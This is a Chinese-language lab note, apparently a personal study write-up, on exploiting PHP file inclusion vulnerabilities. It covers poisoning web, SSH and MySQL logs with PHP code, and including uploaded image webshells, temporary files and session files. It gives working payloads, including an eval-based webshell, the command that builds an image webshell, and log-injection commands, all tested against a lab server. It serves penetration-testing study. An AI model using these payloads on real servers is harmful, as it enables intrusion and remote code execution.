[TOC]



# ==文件包含漏洞利用==

## 一、利用前提

(1) 存在一个文件包含漏洞点

(2) 我们有其他可控点可以写入到本地文件

(3) 写入的本地文件路径可知或可预测



## 二、包含web日志

前期通过信息搜集，得到了相关的服务器信息，比如得知中间件是apache。

apche记录web日志的文件有 access.log 和 error.log

这时候我们访问服务器的时候，通过burp修改我们的请求，将恶意代码写在请求内，这时候web日志就会将我们的恶意代码写入到日志文件中。由于日志文件一般来说都说默认的路径，比较容易猜测，这样就满足了我们的本地包含getshell的条件。

比如get请求 `get "<?php phpinfo();?>" .html`

### 熟悉环境

**xampp环境**下的日志文件路径在 `/opt/lampp/logs/` 其中就包含了 access_log 和 error_log

![image-20240801082256732](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801082256732.png)

其中access_log 日志文件格式内容有 访问者IP 访问时间 请求方式 用户请求的URL地址 状态码 ，主要是GET请求的url地址

![image-20240801083239229](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801083239229.png)

**nginx环境**下的日志文件路径在 `/usr/local/nginx/logs/` 其中就包含了 access.log 和 error.log

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801083004389.png" alt="image-20240801083004389" style="zoom:150%;" />

其中access.log 日志文件格式内容有如下，访问者IP 访问时间 请求方式 状态码 用户请求的URL地址 user-agent client-info

![image-20240801083519248](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801083519248.png)

### 注入测试

- 访问请求`http://192.168.230.147/security/fileinc.php?filename=<?php phpinfo(); ?>`![image-20240801084451981](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801084451981.png)![image-20240801084537719](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801084537719.png)

  ok，发现日志文件中出现了 phpinfo() 但是 < ? > 三个符号被替换了

  再次尝试`http://192.168.230.147/security/fileinc.php?filename="<?php phpinfo(); ?>"` ![image-20240801085030002](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801085030002.png)内容依旧被替换掉

  大不了尝试包含一下![image-20240801085405824](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801085405824.png)这种情况说明应该是浏览器发给服务器的时候就已经被转码掉了，那么我们问什么不想着绕过浏览器直接给服务器发送请求呢？![image-20240801085650884](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801085650884.png)

  正如我们所说，浏览器直接对我们的输入请求及逆行了转码

  使用burp给服务器发请求![image-20240801085837559](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801085837559.png)

  尝试包含![image-20240801085940329](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801085940329.png)

  这是因为此时我们的日志文件中只有 `<?php phpinfo();` 没有 `?>`  这个结束符，然后包含文件发现 <?php 就开始执行php，但是往后都发现了一个 GET，不理解，就报错了![image-20240801090136679](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801090136679.png)

  继续尝试**注入`<?php phpinfo();?>`** 既然空格之后的东西没有了，那我就去掉空格![image-20240801090346187](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801090346187.png)尝试包含

  ![image-20240801090414896](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801090414896.png)成功啦

- 我们想想，既然是请求中空格之后的东西会消失，那么如果有时候<?php后面的东西也都没有了怎么办，比如![image-20240801090730151](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801090730151.png)

  那我们再尝试一下删掉所有空格

  ![image-20240801090924550](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801090924550.png)

  ![image-20240801090847881](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801090847881.png)

  也是错的，相当于他把整个 phpphpinfo() 当做了一个函数，那么意思是只要是 `<?` 和 `?>` 之间的内容都会被当作php代码执行，那么我们直接注入 `<?phpinfo();?>` 

  ![image-20240801091143789](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801091143789.png)

  成功

- **总结，成功的payload有 `<?php phpinfo();?>` 和 `<?phpinfo();?>` 以及 `<?php @eval($_POST['a']);?>`  和 `<?@eval($_POST['a']);?>`，且需要避开使用浏览器发送，可以使用burp**

  - <?php 后跟一个空格可以，但是代码结束的 ; 后跟空格就不行

  ![image-20240801091459202](C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20240801091459202.png)

  ![image-20240801091634413](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801091634413.png)

- 菜刀连接木马

  ![image-20240801092215472](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801092215472.png)

  ![image-20240801092227861](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801092227861.png)

  **over**

## 三、包含登录日志

如果发现一个Linux系统，开放了22端口，同时存在文件包含漏洞。那么我们可以构造恶意登录在ssh登录日志中写入恶意代码。

Linux默认登录日志路径:/var/log/auth.log 或/var/log/secure

使用xshell或ssh命令进行ssh登录: `ssh"<?php phpinfo0);?>”@192.168.112.188`，此时，登录日志中将出现PHP代码。

### ssh登录注入测试

- `var/log/secure` 该文件就是记录ssh登录日志的文件

   `-rw-------. 1 root root   6136 8月   1 08:31 secure` 

  默认情况下该文件其他用户是无法读取的

- 尝试登录 使用 `ssh "<?phpinfo();?>"@192.168.230.147` 进行登录注入

  ![image-20240801093204011](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801093204011.png)

  ![image-20240801093145188](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801093145188.png)

- 尝试包含，很显然，权限不够，没有读权限

  ![image-20240801093315812](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801093315812.png)

### mysql登录注入测试

- xampp环境下的mysql登录日志默认没有开启，需要自己手动添加配置[CentOS7下MySQL5.7日志配置_centos7 mysql5.7 开启归档日志-CSDN博客](https://blog.csdn.net/mall_lucy/article/details/108800590#:~:text=在 MySQL 配置文件（%2Fetc%2Fmy.cnf）中写入：,%23 开启通用日志 general_log%3D1)

- 错误登录，注入恶意代码进日志文件

  ![image-20240801095351449](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801095351449.png)

  ![image-20240801095455204](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801095455204.png)

- 包含一下

  ![image-20240801095526468](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801095526468.png)

  没有权限，但事实上一个系统的管理员一般都会给该文件设置可读的权限

  ![image-20240801095730109](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801095730109.png)

  ![image-20240801095702307](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801095702307.png)

## 四、包含mysql日志

如果MySQL开放远程登录，我们也同样可以登录MySQL并包含MySQL日志: `mysql -u “<?php phpinfo();?> -p -h 192.168.112.188`

在Linux上默认是关闭MySQL日志的，开启MySQL日志:

```
修改 /opt/lampp/etc/my.cnf

general_log = ON
general_log_file = /opt/lampp/logs/mysql.log
log_output = file

确保/opt/lampp/logs目录具备o+w的权限,或者将日志文件写入到mysq1自己的文件夹,同时 mysq1.log还需要 o+r 的权限
```

> MySQL5.7版本，或者非Lampp套件，my.cnf的配置文件路径可能在/etc/my.cnf 下，需要确认
>
> [CentOS7下MySQL5.7日志配置_centos7 mysql5.7 开启归档日志-CSDN博客](https://blog.csdn.net/mall_lucy/article/details/108800590#:~:text=在 MySQL 配置文件（%2Fetc%2Fmy.cnf）中写入：,%23 开启通用日志 general_log%3D1)
>
> 看这个链接，需要自己手动添加配置

包含mysql一般是在成功访问到MySQL后实现的。攻击者进入MySQL，可以通过数据库查询接口，实现恶意代码的写入mysql日志。方法和原理与包含web日志相同。比如进入phpmyadmin后台，或者爆破成功进入MySQL。

查看日志文件状态: `show variables like 'general_log'`

写入恶意代码:`select“<?phpinfo();?>"`根据日志文件路径即可包含。

虽然能够到这一步，已经是渗透测试成功，但是如果Web服务器的权限更高的话，那么可以让Web服务器来包含日志（就相当于是利用web服务器的权限来执行木马），这样Web shell就会被高权限账号执行，实现提权。

### 注入测试

- 执行sql语句

  ![image-20240801100306997](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801100306997.png)

- 查看日志

  ![image-20240801100339370](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801100339370.png)

- 尝试包含

  

## 五、包含上传文件

上传的话因为会检查后缀名，导致直接上传可执行文件失败。如果存在文件包含，就可以上传符合服务器的后缀名文件，但是在文件中写入恶意代码。比如使用图片马来进行文件上传，进而再将其包含进来

`copy picture.jpg/b + shell.php/a picma.jpg`

### 注入测试

- 制作图片马

  ![image-20240801101040652](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801101040652.png)

  ![image-20240801101159212](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801101159212.png)

  ![image-20240801101208679](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801101208679.png)

  用记事本打开图片我们就可以看到，木马已经嵌入到图片之中了，而且图片依旧可以正常显示

  ![image-20240801101317785](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801101317785.png)

  然后上传这个图片到目标服务器

- 包含该图片马，成功

  ![image-20240801101938005](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801101938005.png)

## 六、包含临时文件

临时文件指的是服务器会短暂存储，但是后续很快删除的文件。比如上传检测的时候，某些检测机制会先把上传的文件保存到一个临时文件夹里或沙盒里，临时文件要看具体业务逻辑，而且包含临时文件需要利用条件竞争的方式。动静比较大，容易被发现。

竞争条件的使用方法:

- 使用burpsuite不停的发送上传包
- 我们在文件包含页面不停的尝试包含上传文件，期望恶意文件在被服务器删除之前访问到。
- 一旦包含成功，即使文件被删除，只要shel不断，就可以保持连接



## 七、包含session文件

通过cookie可以得知sessionlD，session文件默认在服务器中存放的格式是sess_sessID,而路径也是固定的大多存在temp目录下。因此只要找到一个可以控制session文件写入的点，就能利用包含漏洞getshell

![image-20240801102501341](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240801102501341.png)
